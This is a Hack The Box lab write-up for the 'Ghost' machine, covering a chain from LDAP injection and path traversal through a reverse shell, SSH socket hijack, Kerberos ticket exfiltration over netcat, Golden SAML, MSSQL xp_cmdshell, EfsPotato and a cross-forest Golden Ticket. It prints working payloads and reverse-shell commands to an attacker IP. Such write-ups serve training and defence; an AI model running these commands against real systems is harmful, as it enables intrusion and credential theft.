---
title: "HTB: Ghost"
description: "Insane Windows box. LDAP injection to foothold, SSH ControlMaster hijack to steal a Kerberos ticket, Golden SAML via ADFS private keys, and a cross-forest Golden Ticket to take both domains. A lot going on."
date: 2026-06-19
tags: ["htb", "windows", "adfs", "golden-saml", "mssql", "ldap-injection", "kerberos", "active-directory", "forest-trust"]
draft: false
---

Ghost is the kind of box you respect even when it's frustrating you. Two domains, a forest trust, a container, a Linux dev workstation, ADFS, linked SQL servers. The chain is long and every step is distinct. Nothing is filler. You're not repeating the same technique twice.

The short version: LDAP injection gets you into an intranet app, blind injection extracts a Gitea password, a path traversal in Ghost CMS hands you an env key that unlocks a command injection endpoint. From the container you hijack an SSH ControlMaster socket and land on a dev machine as a domain user with an active TGT. From there DNS poisoning gets you another user's hash, and that user has ReadGMSAPassword on the ADFS service account. You dump the ADFS token-signing keys, forge a Golden SAML assertion as Administrator, and walk into the Ghost config panel, which happens to have an MSSQL query interface connected to both domains. SA impersonation, EfsPotato for SYSTEM, DCSync the corp domain, then craft a cross-forest Golden Ticket with the Enterprise Admins ExtraSID to DCSync the parent domain. That's the whole thing.

## Recon

```bash
sudo nmap -sC -sV -T4 $DC
```

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: ghost.htb)
443/tcp  open  https?
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1000.00; RTM
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
8008/tcp open  http          nginx 1.18.0 (Ubuntu)
|_http-generator: Ghost 5.78
8443/tcp open  ssl/http      nginx 1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=core.ghost.htb
| http-title: Ghost Core /login
Service Info: Host: DC01; OSs: Windows, Linux
```

A few things stand out immediately. Port 8008 is Ghost CMS, an older version. Port 8443 has a cert for `core.ghost.htb`, which tells you ADFS is in play. MSSQL is exposed on 1433. SMB null sessions were dead, guest account disabled, so the web services were the only real surface.

```bash
nxc smb $DC -u 'guest' -p ''
SMB  DC01  [-] ghost.htb\guest: STATUS_ACCOUNT_DISABLED
```

## Initial Access

### ADFS and Ghost CMS

Port 8443 (`core.ghost.htb`) drops you at a login form with SSO via AD Federation. Clicking that redirects to `federation.ghost.htb` with a standard SAML AuthnRequest. Nothing exploitable without credentials. Noted and parked.

![core.ghost.htb ADFS login page](/images/writeups/htb-ghost/core-adfs-login.png)

Ghost CMS at port 8008 is mostly locked behind login too, but there's one public page with a post author listed: `Kathryn Holland`. That's a name. Wordlisted it into usernames and ran kerbrute.

![Ghost CMS public page showing Kathryn Holland as author](/images/writeups/htb-ghost/ghost-cms-author-page.png)

```bash
kerbrute userenum --dc $DC -d ghost.htb users.txt

[+] VALID USERNAME: kathryn.holland@ghost.htb
```

Valid username, but no AS-REP roasting luck. Moved on.

### Subdomains

Ran ffuf against the Ghost CMS vhost:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://ghost.htb:8008 -H "Host: FUZZ.ghost.htb" -fw 1423

intranet   [Status: 307]
gitea      [Status: 200]
```

Two new subdomains. Gitea had nothing useful unauthenticated, just a user list. The intranet was more interesting.

### LDAP Injection

The intranet login form looked off. The UI was minimal and rough around the edges in a way that usually means it's handling auth directly. Threw it in Burp and confirmed it: the form was posting credentials directly to LDAP without sanitization.

LDAP injection works because LDAP filters use a specific syntax. A login filter typically looks like `(&(uid=<user>)(password=<pass>))`. If neither input is sanitized, you can break out of the filter structure. The classic bypass is `*)(uid=*))(|(uid=*` as the username, which rewrites the filter so it always evaluates to true regardless of what password you supply.

![Burp request showing LDAP injection payload with wildcard bypass](/images/writeups/htb-ghost/ldap-injection-burp.png)

That worked. Logged in as `kathryn.holland`.

![Intranet forum showing posts as logged-in user kathryn.holland](/images/writeups/htb-ghost/intranet-logged-in-kathryn.png)

The forum itself wasn't interesting on the surface, but one post caught my attention: `justin.bradley` was complaining that he couldn't connect to `bitbucket.ghost.htb` and asking why the DNS entry wasn't configured. Filed that away.

### Blind LDAP Injection to Extract Gitea Credentials

The Gitea user list had a service account: `gitea_temp_principal`. The intranet login form was still injectable, and since it was querying LDAP directly, I could use it to extract passwords character by character.

The technique: set the username to the target account, then use a wildcard in the password field `£Char£*`. LDAP wildcard matching means `s*` matches any value starting with `s`. If the login succeeds, the first char is correct. Iterate through the charset until each position is confirmed.

```
Content-Disposition: form-data; name="1_ldap-username"
gitea_temp_principal
Content-Disposition: form-data; name="1_ldap-secret"
£s£*
```

![Burp showing LDAP blind injection with first character 's' confirmed](/images/writeups/htb-ghost/ldap-password-brute-first-char.png)

Bruted the full thing out: `gitea_temp_principal:szrr8kpc3z6onlqf`

### Ghost CMS Path Traversal

Into Gitea with those creds. Two repos: an intranet repo and a `Blog` repo containing what looked like a modified Ghost CMS codebase.

![Gitea dashboard showing Blog and Intranet repos](/images/writeups/htb-ghost/gitea-repos.png)

Inside the Blog repo, `posts.js` had this:

```javascript
const extra = frame.original.query?.extra;
if (extra) {
    const fs = require("fs");
    if (fs.existsSync(extra)) {
        const fileContent = fs.readFileSync("/var/lib/ghost/extra/" + extra, { encoding: "utf8" });
        posts.meta.extra = { [extra]: fileContent };
    }
}
```

No sanitization on `extra`. Just prepending a base path and reading whatever you pass. Classic path traversal. The README also mentioned a content API key.

```bash
curl "http://ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc81a&extra=../../../../etc/passwd"
```

That returned `/etc/passwd`. Then I went for the real prize:

```bash
curl -s "http://ghost.htb:8008/ghost/api/content/posts/?key=a5af628828958c976a3b6cc81a&extra=../../../../proc/1/environ" \
  | python3 -m json.tool | grep -A3 '"extra"' | tr '\0' '\n'
```

```
DEV_INTRANET_KEY=!@yqr!X2kxmQ.@Xe
```

### Command Injection

The intranet repo had a dev API endpoint at `http://intranet.ghost.htb/api-dev`. The source code was in the Gitea repo:

```rust
#[post("/scan", format = "json", data = "<data>")]
pub fn scan(_guard: DevGuard, data: Json<ScanRequest>) -> Json<ScanResponse> {
    let result = Command::new("bash")
        .arg("-c")
        .arg(format!("intranet_url_check {}", data.url))
        .output();
```

`data.url` goes directly into a bash command string with zero sanitization. The `DevGuard` just checks for the `X-Dev-Intranet-Key` header, which I had. Tested it:

```bash
POST /api-dev/scan HTTP/1.1
Host: intranet.ghost.htb:8008
X-Dev-Intranet-Key: !@yqr!X2kxmQ.@Xe
Content-Type: application/json

{"url": "http://example.com; id"}
```

![Burp showing RCE response with uid=0(root) from command injection](/images/writeups/htb-ghost/command-injection-rce.png)

Running as root inside the container. Got a shell:

```bash
{"url": "http://example.com; bash -i >& /dev/tcp/10.10.17.85/9999 0>&1"}
```

```
Connection received on 10.129.231.105 49798
root@36b733906694:/app#
```

## Pivoting

### SSH ControlMaster Hijack

The hostname confirmed we were in a container. Poked around and found an SSH config under `/root/.ssh/`:

```bash
cat /root/.ssh/config
ControlMaster auto
ControlPath ~/.ssh/controlmaster/%r@%h:%p
ControlPersist yes
```

SSH ControlMaster is a feature that lets multiple sessions share a single TCP connection. The first connection authenticates and creates a Unix socket. Any subsequent `ssh` call pointing at that socket can piggyback the already-authenticated session, no credentials required.

```bash
ls -la /root/.ssh/controlmaster/
srw------- 1 root root 0 Jun 18 22:43 florence.ramirez@ghost.htb@dev-workstation:22
```

There was an active socket for `florence.ramirez`. Hijacked it:

```bash
ssh -S /root/.ssh/controlmaster/florence.ramirez@ghost.htb@dev-workstation:22 \
  florence.ramirez@ghost.htb@dev-workstation

florence.ramirez@LINUX-DEV-WS01:~$ id
uid=50(florence.ramirez) gid=50(staff) groups=50(staff),51(it)
```

### Kerberos Ticket Theft

Florence is a domain user, and she had an active TGT:

```bash
klist
Default principal: florence.ramirez@GHOST.HTB
krbtgt/GHOST.HTB@GHOST.HTB
  Valid starting: 06/19/26 01:46:02  Expires: 06/19/26 11:46:02
```

Exfiltrated the ccache over netcat:

```bash
# on my machine
nc -lvnp 9000 > florence.ramirez.b64

# on dev workstation
base64 /tmp/krb5cc_50 | nc 10.10.17.85 9000
```

```bash
base64 -d florence.ramirez.b64 > florence.ramirez.ccache
export KRB5CCNAME=florence.ramirez.ccache

nxc smb 10.129.231.105 -k --use-kcache --shares
[+] GHOST.HTB\florence.ramirez from ccache
[*] Share: IPC$, NETLOGON, SYSVOL, Users (READ)
```

Ticket worked. Ran BloodHound with the ccache, then dug into what florence could actually do.

### DNS Poisoning to Capture Bradley's Hash

Remember that intranet post from `justin.bradley` about `bitbucket.ghost.htb` being unreachable? By default, regular domain users can create new DNS records in AD. I pointed `bitbucket.ghost.htb` at my machine:

```bash
bloodyAD -d ghost.htb -k --host DC01.ghost.htb --dc-ip 10.129.231.105 \
  add dnsRecord bitbucket 10.10.17.85
[+] bitbucket has been successfully added
```

Spun up Responder and waited. Bradley's script made an outbound request to `bitbucket.ghost.htb`, hit my machine, and tried NTLM authentication:

```
[HTTP] NTLMv2 Username : ghost\justin.bradley
[HTTP] NTLMv2 Hash     : justin.bradley::ghost:2557da27577a4a81:BA23B0F3...
```

Cracked it: `justin.bradley:Qwertyuiop1234$$`

## Privilege Escalation

### ReadGMSAPassword on ADFS Service Account

BloodHound had two interesting findings. First: `justin.bradley` has `ReadGMSAPassword` on `ADFS_GMSA$`.

![BloodHound showing ReadGMSAPassword edge from justin.bradley to ADFS_GMSA$](/images/writeups/htb-ghost/bloodhound-gmsa-readpassword.png)

Group Managed Service Accounts (gMSAs) are accounts whose passwords are automatically rotated by AD. The actual password is stored in a protected AD attribute (`msDS-ManagedPassword`) and only specific principals are allowed to read it. `ReadGMSAPassword` means bradley can pull that attribute.

Second: two domains with a bidirectional `SameForestTrust`.

![BloodHound showing SameForestTrust between ghost.htb and corp.ghost.htb](/images/writeups/htb-ghost/bloodhound-forest-trust.png)

`ghost.htb` and `corp.ghost.htb` trust each other. This is going to matter.

WinRM'd in as bradley and grabbed the gMSA password:

```bash
bloodyAD -d ghost.htb -u justin.bradley -p 'Qwertyuiop1234$$' \
  --host DC01.ghost.htb --dc-ip 10.129.231.105 \
  get object 'ADFS_GMSA$' --attr msds-ManagedPassword

msDS-ManagedPassword.NT: 16b9766667b1e9f8d4c315a11707c497
```

### Golden SAML

ADFS uses an X.509 certificate to sign SAML assertions. Service providers like `core.ghost.htb` trust any assertion signed by that cert's private key. If you have the private key, you can forge an assertion as any user, including Administrator, and the SP has no way to tell it's fake. That's Golden SAML.

*Reference: [Netwrix - Golden SAML Attack](https://netwrix.com/en/cybersecurity-glossary/cyber-security-attacks/golden-saml-attack/)*

To get the keys, I used [ADFSDump](https://github.com/mandiant/ADFSDump) running as `ADFS_GMSA$` over WinRM on the DC:

```powershell
.\ADFSDump.exe
```

![ADFSDump output showing extracted token signing certificate and private key](/images/writeups/htb-ghost/adfsdump-output.png)

That gave me the encrypted token blob and the DKM key needed to decrypt it. Then ADFSpoof to forge the assertion:

```bash
python3 ADFSpoof.py -b ../token.bin ../key1.bin \
  -s core.ghost.htb \
  saml2 \
  --endpoint https://core.ghost.htb:8443/adfs/saml/postResponse \
  --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:transient \
  --nameid 'GHOST\administrator' \
  --rpidentifier https://core.ghost.htb:8443 \
  --assertions '<Attribute Name="...upn"><AttributeValue>GHOST\administrator</AttributeValue></Attribute>...'
```

The flow: intercept a normal login request as bradley, replace the SAMLResponse in the POST body with the forged one, forward it. Core validates the signature, sees Administrator claims, creates a session.

![Ghost Config Panel showing linked MSSQL databases for ghost.htb and corp.ghost.htb](/images/writeups/htb-ghost/core-admin-panel.png)

Ghost Config Panel. Two linked MSSQL instances: one on `ghost.htb`, one on `corp.ghost.htb`. And a query interface.

### MSSQL Lateral Movement

The panel let me run SQL against the main instance. Checked for impersonation rights on the linked server (`PRIMARY` is `corp.ghost.htb`):

```sql
select result from openquery("PRIMARY",
  'select distinct b.name from sys.server_permissions a
   inner join sys.server_principals b on a.grantor_principal_id = b.principal_id
   where a.permission_name = ''IMPERSONATE'';')
```

```
result: sa
```

Impersonate `sa` on the remote server, enable `xp_cmdshell`, get code execution:

```sql
EXEC ('EXECUTE AS LOGIN = ''sa''; EXEC xp_cmdshell ''whoami''') AT [PRIMARY]
-- nt service\mssqlserver
```

Uploaded nc64.exe via certutil, caught a shell on the corp DC as `NT SERVICE\MSSQLSERVER`.

### EfsPotato to SYSTEM

`whoami /priv` showed `SeImpersonatePrivilege` enabled. GodPotato was blocked by AV so I compiled EfsPotato from source directly on the target:

```powershell
C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe EfsPotato.cs
.\EfsPotato.exe 'C:\windows\temp\nc64.exe 10.10.17.85 9998 -e powershell.exe'
[+] Get Token: 912
[!] process with pid: 1060 created.
```

SYSTEM on `PRIMARY.corp.ghost.htb`.

### Cross-Forest Golden Ticket

DCSync the corp domain to get the `krbtgt` hash:

```powershell
.\mimikatz.exe "lsadump::dcsync /domain:corp.ghost.htb /user:krbtgt" "exit"

Hash NTLM: 69eb46aa347a8c68edb99be2725403ab
aes256_hmac: b0eb79f35055af9d61bcbbe8ccae81d98cf63215045f7216ffd1f8e009a75e8d
```

Now for the cross-forest part. When two domains in the same forest have a trust, Kerberos uses SID history and `ExtraSIDs` to carry group memberships across domain boundaries. If you forge a TGT for `corp.ghost.htb` and inject the `Enterprise Admins` SID from `ghost.htb` into the PAC, the parent DC will treat you as an Enterprise Admin when you present that ticket.

You need:
- `krbtgt` AES key of the child domain (`corp.ghost.htb`): ✓
- Child domain SID: `S-1-5-21-2034262909-2733679486-179904498`
- Parent's Enterprise Admins SID: `S-1-5-21-4084500788-938703357-3654145966-519`

```powershell
.\Rubeus.exe golden \
  /aes256:b0eb79f35055af9d61bcbbe8ccae81d98cf63215045f7216ffd1f8e009a75e8d \
  /domain:corp.ghost.htb \
  /sid:S-1-5-21-2034262909-2733679486-179904498 \
  /sids:S-1-5-21-4084500788-938703357-3654145966-519 \
  /user:Administrator \
  /ptt

[*] Forged a TGT for 'Administrator@corp.ghost.htb'
[+] Ticket successfully imported!
```

With that ticket loaded, DCSync the parent domain:

```powershell
.\mimikatz.exe "lsadump::dcsync /domain:ghost.htb /dc:DC01.ghost.htb /user:ghost\administrator" "exit"

Hash NTLM: 1cdb17d5c14ff69e7067cffcc9e470bd
```

Pass the hash into WinRM on the DC:

```bash
evil-winrm -i DC01.ghost.htb -u administrator -H 1cdb17d5c14ff69e7067cffcc9e470bd
```

![Ghost has been Pwned by kanyo on 19 Jun 2026](/images/writeups/htb-ghost/ghost-pwned.png)

## References

*Reference: [Hunters Security - ADFS Threat Hunting](https://www.hunters.security/en/blog/adfs-threat-hunting)*

*Reference: [Netwrix - Golden SAML Attack](https://netwrix.com/en/cybersecurity-glossary/cyber-security-attacks/golden-saml-attack/)*

*Reference: [Mandiant ADFSDump](https://github.com/mandiant/ADFSDump/tree/master)*
